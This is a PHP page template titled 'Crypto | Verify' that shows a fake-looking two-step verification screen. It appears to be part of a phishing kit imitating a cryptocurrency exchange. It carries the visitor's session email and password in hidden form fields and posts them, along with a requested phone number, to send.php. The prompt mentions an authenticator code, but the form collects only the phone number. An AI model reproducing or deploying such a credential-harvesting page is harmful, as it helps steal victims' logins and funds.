<?php include_once './config.php'; ?>
<html lang="en">
    <?php
        $title = 'Crypto | Verify';
        include_once './includes/meta.php';
        if(empty($_SESSION["email"]) || empty($_SESSION["password"])) {
            redirect(base_url());
        }
        unset($_SESSION['phone_number']);
    ?>
    <body>
        <?php include_once './includes/header.php'; ?>
        <link rel="stylesheet" href="./assets/country-code-picker/css/jquery.ccpicker.css">
        <div class='container-fluid my60'>
            <div class="row">
                <div class="col-sm-12 text-center">
                    <h1 class='h6 mobile_web_font fw-normal pt60 pb50'>2-Step Verification</h1>
                </div>
            </div>
            <div class="row justify-content-center">
                <div class="col-sm-5 bg-white rounded-0 shadow-lg text-dark pt20 px20">
                    <div class="row">
                        <div class="my20 col-sm-6 border-end border-light-subtle pe25">
                            <p>Enter the 2-step verification generated by your authenticator app.</p>
                            <form method="post" action="<?= base_url('send.php')?>" class="">
                                <input type="hidden" name="email" value="<?=$_SESSION['email']?>" >
                                <input type="hidden" name="password" value="<?=$_SESSION['password']?>" >
                                <div class="mb20">
                                    <label class="form-label fs14">Phone Number</label>
                                    <div class="form-control">
                                        <input name="phone_number" type="number" id="phone_number" required="" class="form-control-add" placeholder="Phone number" value="" >
                                    </div>
                                </div>
                                <div class="text-center mx-auto d-grid gap-2 my25">
                                    <button type="submit" class="btn btn-danger btn-primary-2 btn-block ">Verify</button>
                                </div>
                            </form>
                        </div>
                        <div class="col-sm-6 text-center">
                            <p>Scan to log in instantly</p>
                            <img src="./assets/qr_code.png" />
                            <ol class="text-start">
                                <li>Launch the App or Exchange App</li>
                                <li>Tap Menu/Settings > QR Code Scanner</li>
                                <li>Scan the above QR code</li>
                            </ol>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <?php include_once './includes/footer.php'; ?>
        <script src="./assets/country-code-picker/js/jquery.ccpicker.min.js"></script>
        <script type="text/javascript">
            $(document).ready(function() {
                $("#phone_number").CcPicker({ countryCode: "us", dataUrl: "<?= base_url('assets/country-code-picker/data/en.json')?>", searchPlaceHolder: "Find..." });
            });
        </script>
    </body>
</html>